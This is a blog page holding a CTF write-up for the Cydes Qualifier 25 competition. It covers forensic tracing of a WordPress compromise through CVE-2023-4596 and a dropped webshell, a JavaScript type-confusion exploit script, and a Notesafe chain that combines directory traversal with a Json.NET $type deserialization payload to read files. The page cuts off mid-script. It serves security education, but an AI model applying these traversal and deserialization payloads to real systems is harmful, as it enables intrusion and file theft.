@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Megat Zafran">
+
+
+    <meta name="subtitle" content="that one socially inept kid">
+
+
+    <meta name="description" content="whoami">
+
+
+    <meta name="keywords" content="aan0303, megat, ilikeronnnnii">
+
+
+<title>Cydes Qualifier 25 | aan0303</title>
+
+
+
+    <link rel="icon" href="/favicon.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">aan&#39;s stash</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/music">Music</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">aan&#39;s stash</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/music">Music</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Cydes Qualifier 25</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Megat Zafran</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">June 30, 2025&nbsp;&nbsp;13:49:54</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Writeups/">Writeups</a>
+                            
+                                <a href="/categories/Writeups/Local-Competition/">Local Competition</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Sanity-Check"><a href="#Sanity-Check" class="headerlink" title="Sanity Check"></a>Sanity Check</h2><p>Third part of the flag - <code>Badge to Breach: ICS Cyber Siege!</code></p>
+<p><img src="https://hackmd.io/_uploads/BJLyCYpNgg.png" alt="image"></p>
+<p>Second part of the flag - <code>ass1gnrol3s</code></p>
+<p><img src="https://hackmd.io/_uploads/rkem0F64ll.png" alt="image"></p>
+<p>First part of the flag - <code>re4dtherules</code></p>
+<p><img src="https://hackmd.io/_uploads/HJDBCYT4le.png" alt="image"></p>
+<p>flag <code>prelim&#123;re4dtherules_ass1gnrol3s_Badge to Breach: ICS Cyber Siege!&#125;</code></p>
+<h1 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h1><h2 id="0-Forensic-Sanity-Check"><a href="#0-Forensic-Sanity-Check" class="headerlink" title="[0] - Forensic Sanity Check"></a>[0] - Forensic Sanity Check</h2><p>We were first given a linux server image <code>webserver_image.img</code> that was compromised by a threat actor.</p>
+<p>The first flag is located inside the gdrive link that provides the server image. <code>https://drive.google.com/drive/folders/1WVtgX9iRCgv20AhcITdq_s3F9kF64MKw</code></p>
+<p><img src="https://hackmd.io/_uploads/BJNt7YpNge.png" alt="image"></p>
+<p>flag <code>prelim&#123;warming_up_your_forensics_skills_for_real&#125;</code></p>
+<h2 id="1-Initial-vector"><a href="#1-Initial-vector" class="headerlink" title="[1] - Initial vector"></a>[1] - Initial vector</h2><p>Next task is to identify the CVE used by the attacker to gain initial access to the server and the file that has been dropped by the attacker using the PoC.</p>
+<p>Logically, since the attacker most likely gain foothold via the web service, we can take a look at the <code>/var/log/apache2/access.log</code> to identify their activities.</p>
+<p>A review of the <code>access.log</code> indicates that the website is most likely running WordPress due to the presence of <code>/wp-admin</code> endpoint.</p>
+<p><img src="https://hackmd.io/_uploads/HJ9KNt6Vel.png" alt="image"></p>
+<p>Moreover, after analyzing the disk image using FTK imager the location of the web service directory <code>/var/www/html/</code> also verifies that it is indeed running WordPress</p>
+<p><img src="https://hackmd.io/_uploads/ByEMIY64lg.png" alt="image"></p>
+<h3 id="Identifying-CVE"><a href="#Identifying-CVE" class="headerlink" title="Identifying CVE"></a>Identifying CVE</h3><p>WordPress is famous for its plugins that everyone can use. However, outdated plugins often have security vulnerabilities.</p>
+<p>Taking a look inside <code>/var/www/html/wp-content/plugins/</code> this website is using 4 different plugins and one of them is <code>forminator</code>.</p>
+<p><img src="https://hackmd.io/_uploads/SyjAIt64ge.png" alt="image"></p>
+<p>Looking at the content of <code>forminator.php</code> it is stated that it is running on <code>version 1.24.6</code>, which is vulnerable to <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/51664">CVE-2023-4596</a>.</p>
+<p><img src="https://hackmd.io/_uploads/SyrIDK64gx.png" alt="image"></p>
+<h3 id="Understanding-the-PoC"><a href="#Understanding-the-PoC" class="headerlink" title="Understanding the PoC"></a>Understanding the PoC</h3><ol>
+<li><strong>File Upload Bypass</strong>: Attacker uploads PHP file through vulnerable <code>postdata</code> field</li>
+<li><strong>Extension Validation Bypass</strong>: Malicious files bypass file type restrictions</li>
+<li><strong>Code Execution</strong>: Uploaded PHP shell allows remote command execution</li>
+</ol>
+<p>To find out if the attacker is using this specific PoC we can analyze all of the previous file that has been uploaded to the website which can be located at <code>/var/www/html/wp-content/uploads/</code>.</p>
+<p>Here the threat actor dropped multiple malicious file into the website in <code>/var/www/html/wp-content/uploads/2025/03</code> and <code>/var/www/html/wp-content/uploads/2025/06</code> directory.</p>
+<p><img src="https://hackmd.io/_uploads/r11gst6Vlx.png" alt="image"></p>
+<p>In <code>/var/www/html/wp-content/uploads/2025/06</code> is where the threat actor managed to gain foothold by uploading webshell <code>istockphoto-1327339401-612x612-2-300x150.php</code>.</p>
+<p>flag <code>prelim&#123;CVE-2023-4596_6abb43dc87e07140ba94beafda03baad&#125;</code></p>
+<h2 id="5-Persistent-Unintended"><a href="#5-Persistent-Unintended" class="headerlink" title="[5] - Persistent (Unintended)"></a>[5] - Persistent (Unintended)</h2><p>Apart from plugins, during the enumeration phase we suspected that one of the WordPress themes might be using an outdated version.</p>
+<p><img src="https://hackmd.io/_uploads/SyoVTF64ee.png" alt="image"></p>
+<p>Analyzing one of the themes <code>twentytwentyfour</code> there is <code>theme.php</code> file that contains a pastebin url.</p>
+<p><a target="_blank" rel="noopener" href="https://pastebin.com/ELxiB3t1">https://pastebin.com/ELxiB3t1</a></p>
+<p>Visiting the url gave us the flag.</p>
+<p>flag <code>prelim&#123;b4yuf3dr4_m1n1_web5h3ll_p3rs15t3nt&#125;</code></p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Baby-Web"><a href="#Baby-Web" class="headerlink" title="Baby Web"></a>Baby Web</h2><h3 id="The-Vulnerability-Type-Confusion"><a href="#The-Vulnerability-Type-Confusion" class="headerlink" title="The Vulnerability - Type Confusion"></a>The Vulnerability - Type Confusion</h3><p>Code expects <code>query</code> as a string but Express.js body parser converts <code>query[]</code> into an array, causing security bypass.</p>
+<h3 id="Vulnerable-Code"><a href="#Vulnerable-Code" class="headerlink" title="Vulnerable Code"></a>Vulnerable Code</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> query = req.<span class="property">body</span>.<span class="property">query</span>; <span class="comment">// Can be string OR array</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (query.<span class="title function_">includes</span>(<span class="string">&quot;String&quot;</span>)) &#123;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;Access Denied&quot;</span>); <span class="comment">// Filter bypass</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (query.<span class="title function_">includes</span>(key)) &#123;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;Flag: &quot;</span> + flag); <span class="comment">// Authentication check</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Exploit-Script"><a href="#Exploit-Script" class="headerlink" title="Exploit Script"></a>Exploit Script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># Configuration</span></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://localhost:10009&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Target: <span class="subst">&#123;TARGET_URL&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Exploiting JavaScript type confusion...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;query[]&#x27;</span>: <span class="string">&quot;randomBytes(16).toString(&#x27;hex&#x27;)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(<span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/search&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Here is your flag:&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] SUCCESS! Flag found:&quot;</span>)</span><br><span class="line">        <span class="comment"># Extract flag from response</span></span><br><span class="line">        flag_start = response.text.find(<span class="string">&quot;Here is your flag:&quot;</span>) + <span class="built_in">len</span>(<span class="string">&quot;Here is your flag:&quot;</span>)</span><br><span class="line">        flag_end = response.text.find(<span class="string">&quot;&lt;/pre&gt;&quot;</span>, flag_start)</span><br><span class="line">        flag = response.text[flag_start:flag_end].strip()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Exploit failed&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Response: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+
+<p>flag <code>prelim&#123;i_was_confused_ab_what_to_make--so_i_made_a_js_type_confusion_baby_challenge_ehhe&#125;</code></p>
+<h2 id="Notesafe-Trust-Issues"><a href="#Notesafe-Trust-Issues" class="headerlink" title="Notesafe: Trust Issues"></a>Notesafe: Trust Issues</h2><p>Looking at the file structure of this challenge it looks it is ASP.NET Core web application, due to the presence of <code>Microsoft.AspNetCore.Authentication.JwtBearer.dll</code> file</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:.</span><br><span class="line">│   docker-compose.yml</span><br><span class="line">│   flag.txt</span><br><span class="line">│   NoteSafe.zip</span><br><span class="line">│   README.md</span><br><span class="line">│</span><br><span class="line">└───NoteSafe</span><br><span class="line">    ├───NoteSafe</span><br><span class="line">    │   │   appsettings.Development.json</span><br><span class="line">    │   │   appsettings.json</span><br><span class="line">    │   │   Microsoft.AspNetCore.Authentication.JwtBearer.dll</span><br><span class="line">    │   │   Microsoft.Data.Sqlite.dll</span><br><span class="line">    │   │   NoteSafe.dll</span><br></pre></td></tr></table></figure>
+
+<p>Another useful information is that the flag is located at <code>root</code> and apart from that, we discovered that there are custom classes being integrated into the web application which is compiled into <code>NoteSafe.dll</code></p>
+<p>To get our hands into the classes, we can decompile it using <code>https://www.decompiler.com/</code>. After we managed to decompile it here is the vulnerable classes available inside it.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NoteSafe.Helpers</span><br><span class="line">│   JsonHelper.cs          ← ROOT VULNERABILITY (enabled the attack)</span><br><span class="line"></span><br><span class="line">NoteSafe.Services</span><br><span class="line">│   NoteService.cs         ← ENTRY POINT (called vulnerable JsonHelper)</span><br><span class="line">│   FileSystemService.cs   ← FILE READ GADGET (successfully used)</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-FilesController-cs-Directory-Traversal-in-File-Listing"><a href="#1-FilesController-cs-Directory-Traversal-in-File-Listing" class="headerlink" title="1. FilesController.cs - Directory Traversal in File Listing"></a>1. FilesController.cs - Directory Traversal in File Listing</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Vulnerable endpoint in FilesController.cs</span></span><br><span class="line">[<span class="meta">HttpGet(<span class="string">&quot;list&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> IActionResult <span class="title">ListFiles</span>(<span class="params"><span class="built_in">string</span> folder</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// VULNERABILITY: No path validation or sanitization</span></span><br><span class="line">    <span class="keyword">var</span> targetPath = Path.Combine(baseDirectory, folder);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This allows &quot;../&quot; sequences to escape the intended directory</span></span><br><span class="line">    <span class="keyword">var</span> files = Directory.GetFiles(targetPath);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Json(files);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Request:</strong> <code>GET /api/files/list?folder=../</code></p>
+<p><strong>Response:</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;currentPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;/app/../&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;files&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;flag-BqBEGkm6F8.txt&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;/app/../flag-BqBEGkm6F8.txt&quot;</span><span class="punctuation">,</span><span class="attr">&quot;size&quot;</span><span class="punctuation">:</span><span class="number">36</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;lastModified&quot;</span><span class="punctuation">:</span><span class="string">&quot;2025-06-19T20:56:28.7842621+00:00&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span>`</span><br><span class="line">...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-JsonHelper-cs-Unsafe-Deserialization"><a href="#2-JsonHelper-cs-Unsafe-Deserialization" class="headerlink" title="2. JsonHelper.cs - Unsafe Deserialization"></a>2. JsonHelper.cs - Unsafe Deserialization</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeNameHandling = (TypeNameHandling)<span class="number">3</span>,  <span class="comment">// TypeNameHandling.All</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Why vulnerable:</strong> Allows <code>$type</code> attacks to create any .NET class</p>
+<h3 id="3-FileSystemService-cs-Dangerous-Getter"><a href="#3-FileSystemService-cs-Dangerous-Getter" class="headerlink" title="3. FileSystemService.cs - Dangerous Getter"></a>3. FileSystemService.cs - Dangerous Getter</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> FileContents</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">get</span> &#123; <span class="keyword">return</span> File.ReadAllText(FilePath); &#125; <span class="comment">// File read in getter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Why vulnerable:</strong> Property getter performs file I&#x2F;O operations</p>
+<p><strong>Request:</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/notes</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-bash">&#123;</span></span><br><span class="line"><span class="language-bash">    <span class="string">&quot;<span class="variable">$type</span>&quot;</span>: <span class="string">&quot;NoteSafe.Services.FileSystemService, NoteSafe&quot;</span>,</span></span><br><span class="line"><span class="language-bash">    <span class="string">&quot;FilePath&quot;</span>: <span class="string">&quot;/app/../flag-BqBEGkm6F8.txt&quot;</span></span></span><br><span class="line"><span class="language-bash">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Response:</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Invalid object type. Debug info<span class="punctuation">:</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;FilePath&quot;</span><span class="punctuation">:</span><span class="string">&quot;/app/../flag-pcBcmDqCak.txt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;FileContents&quot;</span><span class="punctuation">:</span><span class="string">&quot;prelim&#123;buzzw0rd5_4r3_n0t_3ncrypt10n&#125;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Complete-Attack-Flow"><a href="#Complete-Attack-Flow" class="headerlink" title="Complete Attack Flow:"></a>Complete Attack Flow:</h3><p>Register a new account -&gt; Login -&gt; <strong>directory traversal</strong> → Discover flag filename → <strong>JSON deserialization</strong> → File read gadget → Extract Flag</p>
+<h3 id="Exploit-Script-1"><a href="#Exploit-Script-1" class="headerlink" title="Exploit Script"></a>Exploit Script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://152.42.220.146:54984&quot;</span></span><br><span class="line">USERNAME = <span class="string">&quot;testuser&quot;</span></span><br><span class="line">PASSWORD = <span class="string">&quot;testpass123&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_antiforgery_token</span>(<span class="params">session, url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Get anti-forgery token from page&quot;&quot;&quot;</span></span><br><span class="line">    response = session.get(url)</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;name=&quot;__RequestVerificationToken&quot; type=&quot;hidden&quot; value=&quot;([^&quot;]+)&quot;&#x27;</span>, response.text)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>) <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Target: <span class="subst">&#123;TARGET_URL&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Try registration first</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Attempting registration...&quot;</span>)</span><br><span class="line">    token = get_antiforgery_token(session, <span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/Account/Register&quot;</span>)</span><br><span class="line"></span><br><span class="line">    register_data = &#123;</span><br><span class="line">        <span class="string">&#x27;Username&#x27;</span>: USERNAME,</span><br><span class="line">        <span class="string">&#x27;Password&#x27;</span>: PASSWORD,</span><br><span class="line">        <span class="string">&#x27;ConfirmPassword&#x27;</span>: PASSWORD</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> token:</span><br><span class="line">        register_data[<span class="string">&#x27;__RequestVerificationToken&#x27;</span>] = token</span><br><span class="line"></span><br><span class="line">    reg_response = session.post(<span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/Account/Register&quot;</span>, data=register_data, allow_redirects=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check if registration worked (should redirect to dashboard)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Dashboard&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> reg_response.text <span class="keyword">and</span> <span class="string">&#x27;dashboard&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> reg_response.url.lower():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Registration failed, trying login...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Try login instead</span></span><br><span class="line">        login_token = get_antiforgery_token(session, <span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/Account/Login&quot;</span>)</span><br><span class="line"></span><br><span class="line">        login_data = &#123;</span><br><span class="line">            <span class="string">&#x27;Username&#x27;</span>: USERNAME,</span><br><span class="line">            <span class="string">&#x27;Password&#x27;</span>: PASSWORD</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> login_token:</span><br><span class="line">            login_data[<span class="string">&#x27;__RequestVerificationToken&#x27;</span>] = login_token</span><br><span class="line"></span><br><span class="line">        login_response = session.post(<span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/Account/Login&quot;</span>, data=login_data, allow_redirects=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Dashboard&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> login_response.text <span class="keyword">and</span> <span class="string">&#x27;dashboard&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> 